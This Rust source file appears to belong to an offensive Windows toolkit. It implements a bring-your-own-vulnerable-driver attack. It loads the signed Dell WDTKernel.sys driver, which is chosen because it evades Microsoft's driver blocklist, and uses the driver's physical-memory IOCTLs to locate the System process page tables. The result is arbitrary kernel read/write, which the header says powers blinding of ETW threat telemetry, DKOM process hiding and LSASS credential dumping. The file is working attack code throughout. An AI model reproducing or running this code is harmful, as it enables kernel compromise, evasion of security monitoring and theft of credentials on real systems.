//! WDTKernel.sys phys-mode bootstrap — the blocklist-safe BYOVD path.
//!
//! WDTKernel (Dell Watchdog Timer, LOLDrivers #290) is WHQL-signed and NOT
//! on Microsoft's vulnerable-driver blocklist (`LoadsDespiteHVCI: TRUE`) — it
//! loads where RTCore64 cannot (blocklisted → `NtLoadDriver` 0xC0000034 /
//! 0xC0000428 on hardened hosts, verified on the GitHub windows-2022 image
//! 2026-08-13). Its primitive is PHYSICAL-only: every IOCTL feeds a
//! user-supplied physical address straight to `MmMapIoSpace`. This module:
//!   1. loads the driver and opens `\\.\__WDT__`,
//!   2. discovers the System process CR3 by scanning physical memory for the
//!      System EPROCESS (`System\0` ImageFileName at the table-verified
//!      offset, pool-aligned candidate, UniqueProcessId == 4) and reading
//!      `_KPROCESS.DirectoryTableBase` (+0x28 — x64-stable across
//!      10240–26200; KPROCESS is ABI-frozen, the pg-pdb-verify pass reads
//!      the same value from the real ntkrnlmp.pdb),
//!   3. validates each candidate CR3 by page-walking the ntoskrnl base VA
//!      through it and requiring `MZ` at the resolved physical page (false
//!      positive probability ≈ 0),
//!   4. wraps the physical primitive in [`VaKernelRw`] (4-level VA→PA walk)
//!      so the standard tier ops (assess / ETW-TI blind / DKOM hide / LSASS
//!      dump) run unchanged.
//!
//! ## Failure model
//! Every stage degrades to a named error — never a silent wrong read: the
//! CR3 validation gate means a bogus DirectoryTableBase is discarded, not
//! fed to the walk (mapping garbage physical addresses is a BSOD path).
#![cfg(target_os = "windows")]

use crate::byovd::{resolve_sym, DeviceIoControlFn, VulnDriverIoctl};
use crate::byovd_drivers::wdtkernel::WdtKernel;
use crate::offsets::EprocessOffsets;
use crate::win::driver_load::LoadedDriver;
use crate::win::pagewalk::{translate_va, PhysRead, PhysReadError};
use crate::win::va_rw::{PhysWrite, VaKernelRw};
use crate::{KitError, KrwError};
use alloc::vec;
use core::ffi::c_void;

/// `_KPROCESS.DirectoryTableBase` — x64 offset inside `_EPROCESS`. KPROCESS
/// is embedded at `_EPROCESS+0` and ABI-frozen; 0x28 on every build
/// 10240–26200 (matches the pg-pdb-verify symbol-server pass).
const DIRECTORY_TABLE_BASE_OFF: u64 = 0x28;

/// Bytes per physical read during the CR3 scan (one MmMapIoSpace mapping).
const SCAN_CHUNK: usize = 1024 * 1024;

/// Cap per-IOCTL transfer — keeps the driver's MmMapIoSpace mappings small.
const IOCTL_CHUNK: usize = 0x40000;

/// Consecutive failed chunks before giving up (a long hole ⇒ past RAM end).
const MAX_SCAN_FAILURES: u32 = 32;

/// GENERIC_READ | GENERIC_WRITE.
const GENERIC_RW: u32 = 0xC000_0000;
const OPEN_EXISTING: u32 = 3;
const INVALID_HANDLE: *mut c_void = (-1isize) as *mut c_void;

type CreateFileWFn = unsafe extern "system" fn(
    *const u16,
    u32,
    u32,
    *mut c_void,
    u32,
    u32,
    *mut c_void,
) -> *mut c_void;
type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

/// Physical-memory R/W primitive over a live `\\.\__WDT__` handle.
pub struct WdtPhys {
    device: *mut c_void,
    dioctl: DeviceIoControlFn,
    close: CloseHandleFn,
}

// Raw handle + raw fn pointers; the handle is owned exclusively by this
// struct and the fns are immutable kernel32 code addresses.
unsafe impl Send for WdtPhys {}
unsafe impl Sync for WdtPhys {}

impl Drop for WdtPhys {
    fn drop(&mut self) {
        unsafe {
            (self.close)(self.device);
        }
    }
}

impl WdtPhys {
    /// Chunked physical read (bounded per-IOCTL transfer).
    fn read_at(&self, pa: u64, dst: &mut [u8]) -> Result<(), KrwError> {
        for (i, part) in dst.chunks_mut(IOCTL_CHUNK).enumerate() {
            let off = (i as u64).saturating_mul(IOCTL_CHUNK as u64);
            unsafe {
                WdtKernel::phys_read(self.device, self.dioctl, pa + off, part)?;
            }
        }
        Ok(())
    }

    /// Chunked physical write (bounded per-IOCTL transfer).
    fn write_at(&self, pa: u64, src: &[u8]) -> Result<(), KrwError> {
        for (i, part) in src.chunks(IOCTL_CHUNK).enumerate() {
            let off = (i as u64).saturating_mul(IOCTL_CHUNK as u64);
            unsafe {
                WdtKernel::phys_write(self.device, self.dioctl, pa + off, part)?;
            }
        }
        Ok(())
    }
}

impl PhysRead for WdtPhys {
    fn read_phys(&self, pa: u64, dst: &mut [u8]) -> Result<(), PhysReadError> {
        self.read_at(pa, dst).map_err(|_| PhysReadError::Ioctl)
    }
}

impl PhysWrite for WdtPhys {
    fn write_phys(&self, pa: u64, src: &[u8]) -> Result<(), PhysReadError> {
        self.write_at(pa, src).map_err(|_| PhysReadError::Ioctl)
    }
}

/// Open `\\.\__WDT__` and resolve the raw Win32 functions.
///
/// # Safety
/// The device must exist (driver loaded). BSOD-free: open-only.
pub unsafe fn open_wdt() -> Result<WdtPhys, KrwError> {
    let create_file = resolve_sym::<CreateFileWFn>(b"kernel32.dll", b"CreateFileW")?;
    let dioctl = resolve_sym::<DeviceIoControlFn>(b"kernel32.dll", b"DeviceIoControl")?;
    let close = resolve_sym::<CloseHandleFn>(b"kernel32.dll", b"CloseHandle")?;

    // The device_path static is 11 code units WITHOUT a NUL (CreateFileW
    // reads until NUL — the byovd.rs open path documents the same hazard).
    let mut path_buf = [0u16; 12];
    path_buf[..11].copy_from_slice(WdtKernel.device_path());

    let device = unsafe {
        create_file(
            path_buf.as_ptr(),
            GENERIC_RW,
            0,
            core::ptr::null_mut(),
            OPEN_EXISTING,
            0,
            core::ptr::null_mut(),
        )
    };
    if device == INVALID_HANDLE {
        return Err(KrwError::Other(
            "WDT open \\\\.\\__WDT__ failed (driver loaded?)".into(),
        ));
    }
    Ok(WdtPhys {
        device,
        dioctl,
        close,
    })
}

/// Scan physical RAM for the System EPROCESS and return its CR3.
///
/// `scan_budget_mb` caps the scan in MiB (default 2048 from the CLI). Scan
/// strategy: read 1 MiB chunks from PA 0x1000 upward; inside each chunk,
/// look for the ASCII `System\0` of `_EPROCESS.ImageFileName` at the
/// build-specific offset. For each candidate (pool-aligned, PID 4), read
/// `DirectoryTableBase`, then VALIDATE by walking the ntoskrnl base VA
/// through it — the resolved physical page must start with `MZ`. Only a
/// validated CR3 is returned; everything else is discarded.
///
/// # Safety
/// Physical reads only. A bogus CR3 is never returned (validation gate).
pub unsafe fn discover_system_cr3(
    phys: &WdtPhys,
    nt_base: u64,
    ep: &EprocessOffsets,
    scan_budget_mb: usize,
) -> Option<u64> {
    let budget = scan_budget_mb
        .max(1)
        .saturating_mul(1024 * 1024)
        .max(SCAN_CHUNK) as u64;
    let mut buf = vec![0u8; SCAN_CHUNK];
    let mut pa: u64 = 0x1000;
    let mut failures: u32 = 0;
    while pa < budget {
        let n = (budget - pa).min(SCAN_CHUNK as u64) as usize;
        let chunk = &mut buf[..n];
        if phys.read_phys(pa, chunk).is_err() {
            failures += 1;
            if failures >= MAX_SCAN_FAILURES {
                break; // long hole ⇒ past the end of physical RAM
            }
            pa += n as u64;
            continue;
        }
        failures = 0;

        for i in 0..n.saturating_sub(7) {
            if chunk[i..i + 7] != *b"System\x00" {
                continue;
            }
            if i < ep.image_file_name {
                continue;
            }
            let ep_pa = pa + (i - ep.image_file_name) as u64;
            if ep_pa % 0x40 != 0 {
                continue; // object allocation alignment
            }
            // Secondary structural check: the System process has PID 4.
            let mut pid = [0u8; 8];
            if phys
                .read_phys(ep_pa + ep.unique_process_id as u64, &mut pid)
                .is_err()
            {
                continue;
            }
            if u64::from_le_bytes(pid) != 4 {
                continue;
            }
            // DirectoryTableBase at +0x28 (KPROCESS, ABI-frozen).
            let mut dtb = [0u8; 8];
            if phys
                .read_phys(ep_pa + DIRECTORY_TABLE_BASE_OFF, &mut dtb)
                .is_err()
            {
                continue;
            }
            let cr3 = u64::from_le_bytes(dtb) & 0x000F_FFFF_FFFF_F000;
            if cr3 == 0 {
                continue;
            }
            // Decisive validation: ntoskrnl base VA → PA via candidate CR3,
            // and the mapped page must start with the DOS header.
            match translate_va(phys, cr3, nt_base) {
                Ok(nt_pa) => {
                    let mut mz = [0u8; 2];
                    if phys.read_phys(nt_pa, &mut mz).is_ok() && &mz == b"MZ" {
                        return Some(cr3);
                    }
                }
                Err(_) => {}
            }
        }
        pa += n as u64;
    }
    None
}

/// Full WDT phys-mode bootstrap: load driver → open device → discover CR3 →
/// wrap in [`VaKernelRw`]. Returns the loaded driver (cleanup) plus the
/// VA-capable `KernelRw`.
///
/// `scan_budget_mb` is the upper MiB bound for physical memory scanning when
/// discovering the System process CR3 (default 2048).
///
/// # Safety
/// Loads a kernel driver and opens its device. BSOD risk only through the
/// returned rw (never during bootstrap — every stage degrades to an error).
pub unsafe fn bootstrap_wdt(
    sys_path: &[u16],
    svc_name: &[u16],
    nt_base: u64,
    eprocess: &EprocessOffsets,
    scan_budget_mb: usize,
) -> Result<(LoadedDriver, VaKernelRw<WdtPhys>), KitError> {
    let loaded = unsafe { LoadedDriver::load(sys_path, svc_name) }
        .map_err(|e| KitError::Other(alloc::format!("driver load: {}", e)))?;

    let phys = match unsafe { open_wdt() } {
        Ok(p) => p,
        Err(e) => {
            let mut l = loaded;
            l.unload();
            return Err(KitError::Other(alloc::format!("wdt open: {}", e)));
        }
    };

    let cr3 = match unsafe { discover_system_cr3(&phys, nt_base, eprocess, scan_budget_mb) } {
        Some(c) => c,
        None => {
            let mut l = loaded;
            l.unload();
            return Err(KitError::Other(
                "wdt cr3 discovery failed (scan budget exhausted, no validated candidate)".into(),
            ));
        }
    };

    Ok((loaded, VaKernelRw::new(phys, cr3)))
}
